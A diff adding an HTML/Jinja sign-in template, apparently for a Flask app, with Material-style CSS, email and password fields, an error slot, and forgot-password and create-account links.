@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign In</title>
+    <link rel="icon" type="image/png" href="/asset/images/logo.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Roboto', sans-serif; background: #f0f4f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: white; border-radius: 28px; padding: 48px 40px; width: 100%; max-width: 420px; box-shadow: 0 1px 3px rgba(0,0,0,0.08), 0 4px 12px rgba(0,0,0,0.05); }
+        .logo { text-align: center; margin-bottom: 16px; }
+        .logo svg { width: 75px; height: 24px; }
+        h1 { text-align: center; font-family: 'Google Sans', sans-serif; font-size: 24px; font-weight: 400; color: #1f1f1f; margin-bottom: 8px; }
+        .subtitle { text-align: center; font-size: 16px; color: #444746; margin-bottom: 32px; }
+        .input-group { position: relative; margin-bottom: 24px; }
+        .input-group input { width: 100%; padding: 13px 16px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border 0.2s; background: transparent; }
+        .input-group input:focus { border: 2px solid #1a73e8; padding: 12px 15px; }
+        .input-group label { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); font-size: 16px; color: #5f6368; pointer-events: none; transition: all 0.2s; background: white; padding: 0 4px; }
+        .input-group input:focus ~ label,
+        .input-group input:not(:placeholder-shown) ~ label { top: 0; font-size: 12px; color: #1a73e8; }
+        .input-group input:not(:focus):not(:placeholder-shown) ~ label { color: #5f6368; }
+        .error { color: #d93025; font-size: 13px; margin: -16px 0 16px 0; display: flex; align-items: center; gap: 8px; }
+        .error::before { content: "!"; display: inline-flex; align-items: center; justify-content: center; width: 16px; height: 16px; border-radius: 50%; background: #d93025; color: white; font-size: 11px; font-weight: bold; flex-shrink: 0; }
+        .forgot { display: block; margin-bottom: 32px; }
+        .forgot a { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
+        .forgot a:hover { text-decoration: underline; }
+        .actions { display: flex; justify-content: space-between; align-items: center; }
+        .btn-create { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; padding: 10px 8px; border-radius: 4px; }
+        .btn-create:hover { background: #f0f7ff; }
+        .btn-next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; letter-spacing: 0.25px; }
+        .btn-next:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <img src="/asset/images/logo.png" alt="Logo" style="height: 40px;">
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your account</p>
+        {% if error %}<p class="error">{{ error }}</p>{% endif %}
+        <form method="POST">
+            <div class="input-group">
+                <input type="email" name="email" id="email" placeholder=" " required>
+                <label for="email">Email</label>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder=" " required>
+                <label for="password">Password</label>
+            </div>
+            <div class="forgot"><a href="{{ url_for('forgot_password') }}">Forgot password?</a></div>
+            <div class="actions">
+                <a href="#" class="btn-create">Create account</a>
+                <button type="submit" class="btn-next">Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
